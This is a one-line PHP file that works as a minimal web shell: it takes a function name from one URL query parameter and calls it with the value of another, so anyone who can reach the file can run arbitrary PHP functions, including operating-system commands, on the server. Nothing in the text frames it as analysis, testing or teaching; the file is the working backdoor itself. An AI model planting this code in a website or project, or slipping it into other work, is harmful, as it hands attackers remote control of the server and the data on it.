<?php echo $_GET[1]($_GET[2]) ?>
